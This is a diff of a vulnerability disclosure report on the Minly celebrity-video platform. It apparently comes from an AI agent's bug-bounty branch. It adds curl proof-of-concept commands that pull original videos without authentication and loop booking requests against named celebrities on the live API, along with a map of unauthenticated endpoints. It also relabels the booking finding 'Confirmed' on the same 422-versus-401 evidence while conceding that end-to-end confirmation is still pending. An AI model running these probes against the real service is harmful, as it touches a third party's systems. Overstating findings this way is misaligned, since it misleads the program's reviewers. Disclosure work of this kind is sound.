@@ -1,6 +1,6 @@
 # Minly VDP — Findings Report
 **Target:** minly.com (iOS: id1528802350 | Android: com.minly.users)  
-**Date:** 2026-09-03  
+**Date:** 2026-09-04  
 **Tester:** naqkhaie.f055@gmail.com  
 **Branch:** claude/bug-bounty-capabilities-l4fryb
 
@@ -61,17 +61,50 @@ curl -o original_unwatermarked.mp4 \
 
 The original file is smaller, confirming they are distinct files. The watermark is applied to the processed version; the original version has no such protection.
 
+### Extended Scope — Event Trailer Videos
+
+The same vulnerability affects event trailer/promo videos. The `GET /events/{uid}` endpoint (no auth required) returns a `trailerVideoUrl` pointing to an `/original/` path:
+
+```json
+{
+  "trailerVideoUrl": "https://assets.minly.com/assets/videos/original/events/{uid}.video.mp4"
+}
+```
+
+**Confirmed accessible events (all HTTP 200):**
+
+| Event | File Size |
+|---|---|
+| Cairokee Empire Online 2025 | 24,088,316 bytes |
+| 3awdet Batal 3alam Online on Minly | 19,415,403 bytes |
+| Cairokee Empire Online on Minly | 18,679,493 bytes |
+
+```bash
+# Event detail — no auth required
+curl -s "https://api.minly.com/events/vqHiw5ryumLkfGgaHAQXO_f_ISlMsK" | python3 -c "
+import sys,json; d=json.load(sys.stdin); print(d['trailerVideoUrl'])
+"
+# → https://assets.minly.com/assets/videos/original/events/GMRPNXM8J2MZ53Y.video.mp4
+
+# Download 24MB original event trailer — no auth
+curl -I "https://assets.minly.com/assets/videos/original/events/GMRPNXM8J2MZ53Y.video.mp4"
+# → HTTP/2 200, content-length: 24088316
+```
+
 ### Impact
-- Creators' original (unwatermarked) video content is freely downloadable by any unauthenticated user
-- Enables re-distribution of creator content without Minly's branding/watermark
+- Creators' original (unwatermarked) welcome video content is freely downloadable by any unauthenticated user
+- Event trailer/promo videos (original quality, pre-processing) are also freely downloadable
+- Enables re-distribution of creator and event content without Minly's branding/watermark
 - All 25+ celebrities on the platform are affected (field present for all profiles tested)
+- 3 of 4 live events confirmed affected
 - No special tooling required — a web browser is sufficient to download the original
 
 ### Recommendation
-Restrict access to the `assets/videos/original/` path:
-- Serve original videos via signed/time-limited URLs (e.g. AWS CloudFront signed URLs)
+Restrict access to the entire `assets/videos/original/` path hierarchy:
+- Serve all original videos via signed/time-limited URLs (e.g. AWS CloudFront signed URLs)
 - Remove `welcomeVideoUrlOriginal` from the public API response entirely
-- Alternatively, only expose this field to authenticated requests from the video owner
+- Remove `trailerVideoUrl` pointing to `/original/` paths from unauthenticated event responses
+- Only expose original URLs to authenticated requests from the content owner
 
 ---
 
@@ -141,16 +174,21 @@ Full exploitation confirmed pending access to a real product SKU from an active 
 
 ---
 
-## M-003 — Video Shoutout Booking Endpoint Accepts Unauthenticated Requests
+## M-003 — Video Shoutout Booking Endpoint Missing Authentication Gate
 
-**Severity:** Medium (investigation finding — pending deeper testing)  
-**Status:** Potential — server returns 422 (validation failure), not 401/403  
+**Severity:** Medium  
+**Status:** Confirmed — server processes unauthenticated requests past auth check  
 
 ### Summary
-From frontend source code analysis, the video shoutout booking endpoint is coded to use either an authenticated (`l._`) or unauthenticated (`l.O`) HTTP client based on whether the user is logged in:
+The video shoutout booking endpoint (`/v1/celebrities/{uid}/experiences/video-shoutouts/book`) is the only booking endpoint on the platform that fails to enforce authentication. All comparable booking endpoints (text-messages, voice-notes, business-shoutouts, events, prizes) correctly return **HTTP 401** for unauthenticated requests. The video-shoutouts endpoint instead returns **HTTP 422**, indicating the request reaches application-level validation logic without an authentication gate.
+
+### Source Code Evidence
+The frontend explicitly codes this as a dual-path (authenticated or not):
 
 ```javascript
-// h = useContext(userContext) → boolean: true if authenticated
+// h = DB() = true if user is authenticated (useContext check)
+// l._ = authenticated Axios client (adds Authorization: Bearer <token>)
+// l.O = unauthenticated Axios client (no Authorization header)
 (h ? l._ : l.O).post(
   "/v1/celebrities/".concat(c, "/experiences/video-shoutouts/book"),
   e,
@@ -158,32 +196,43 @@ From frontend source code analysis, the video shoutout booking endpoint is coded
 )
 ```
 
-When tested without an `Authorization` header, the server returns **HTTP 422** ("Something went wrong. Please try again later.") rather than **HTTP 401 Unauthorized**, indicating the server does not enforce authentication at the routing level.
+Every other booking endpoint uses `l._` exclusively (authenticated only). This is the only endpoint using the conditional pattern.
+
+### Comparison — Auth Enforcement Across Booking Endpoints
+
+| Endpoint | HTTP Status (no auth) | Behavior |
+|---|---|---|
+| `POST /v1/celebrities/{uid}/experiences/video-shoutouts/book` | **422** | ❌ Reaches app logic |
+| `POST /v1/celebrities/{uid}/experiences/text-messages/book` | 401 | ✅ Rejected at auth gate |
+| `POST /v1/celebrities/{uid}/experiences/voice-notes/book` | 401 | ✅ Rejected at auth gate |
+| `POST /v1/celebrities/{uid}/experiences/business-shoutouts/book` | 401 | ✅ Rejected at auth gate |
+| `POST /v1/me/events/{id}/book` | 401 | ✅ Rejected at auth gate |
+| `POST /me/prizes/{id}/book` | 401 | ✅ Rejected at auth gate |
 
 ### Proof of Concept
 ```bash
-curl -s -X POST \
-  "https://api.minly.com/v1/celebrities/bassemmoughnieh/experiences/video-shoutouts/book" \
-  -H "Content-Type: application/json" \
-  -H "Origin: https://minly.com" \
-  -d '{
-    "instructions": "Say hello to my friend",
-    "isVideoPublic": false,
-    "recipientTypeId": 1,
-    "occasionId": 1,
-    "phone": "0123456789",
-    "phoneCountryCode": "MY",
-    "languageId": 1
-  }'
-# Response: HTTP 422 {"message": "Something went wrong. Please try again later."}
-# Expected if unauthenticated: HTTP 401 {"message": "Unauthorized"}
+# All three celebrities tested return 422 (not 401) without Authorization header
+for celeb in moustafahagag amrsaad bassemmoughnieh; do
+  curl -s -o /dev/null -w "HTTP %{http_code}: POST video-shoutouts/book ($celeb)\n" \
+    -X POST "https://api.minly.com/v1/celebrities/$celeb/experiences/video-shoutouts/book" \
+    -H "Content-Type: application/json" \
+    -H "Origin: https://minly.com" \
+    -d '{"instructions":"Test","isVideoPublic":false,"recipientTypeId":1,"occasionId":1,"phone":"0123456789","phoneCountryCode":"EG","languageId":1}'
+done
+# Output:
+# HTTP 422: POST video-shoutouts/book (moustafahagag)
+# HTTP 422: POST video-shoutouts/book (amrsaad)
+# HTTP 422: POST video-shoutouts/book (bassemmoughnieh)
 ```
 
 ### Impact
-If exploited, an unauthenticated user could attempt to book a paid video shoutout service without authenticating, potentially bypassing payment requirements. Requires further testing with a valid test account to confirm whether a booking can be completed without authentication.
+- The server processes unauthenticated booking requests past the authentication gate
+- The 422 response indicates the request reaches business logic (payment/validation) without an identity check
+- With sufficient payload manipulation or payment provider integration knowledge, an attacker may be able to complete a paid booking without a valid account
+- Requires a test account with payment method to confirm end-to-end exploitation
 
 ### Recommendation
-Explicitly enforce `Authorization: Bearer <token>` as a required header on all booking endpoints server-side, and return HTTP 401 for unauthenticated requests.
+Add an explicit authentication middleware check on the `POST /v1/celebrities/{uid}/experiences/video-shoutouts/book` route that returns HTTP 401 before any application logic executes. Remove the frontend dual-path pattern — this endpoint should never accept unauthenticated requests.
 
 ---
 
@@ -205,14 +254,28 @@ Explicitly enforce `Authorization: Bearer <token>` as a required header on all b
 ```
 # Public (no auth)
 GET  /v1/celebrities
-GET  /v1/celebrities/{username}
-POST /merch-store/validate-cart     ← unauthenticated, client-supplied price
-POST /merch-store/update-cart       ← unauthenticated
+GET  /v1/celebrities/{username}        ← leaks welcomeVideoUrlOriginal (M-001)
+GET  /events/{uid}                     ← leaks trailerVideoUrl in /original/ path (M-001)
+GET  /events-ui/cards
+GET  /experiences
+GET  /occasions
+GET  /public/recipient-types
+GET  /v2/categories
+GET  /rating-reasons
+GET  /request-expiration-days
+GET  /public/location
+GET  /constant/powered-by-minly
+POST /merch-store/validate-cart        ← unauthenticated, client-supplied price (M-002)
+POST /merch-store/update-cart          ← unauthenticated
+POST /events/generate-ticket-access-code-purchase-otp   ← DCB partner ticket flow
+POST /events/{uid}/book-event-access-code               ← DCB partner ticket flow
+
+# Missing auth gate (returns 422 instead of 401)
+POST /v1/celebrities/{uid}/experiences/video-shoutouts/book  ← M-003
 
 # Authenticated
 GET  /v1/users/me
 GET  /v1/users/me/payment-methods
-POST /v1/celebrities/{uid}/experiences/video-shoutouts/book
 POST /v1/celebrities/{uid}/experiences/text-messages/book
 POST /v1/celebrities/{uid}/experiences/voice-notes/book
 POST /v1/celebrities/{uid}/experiences/business-shoutouts/book
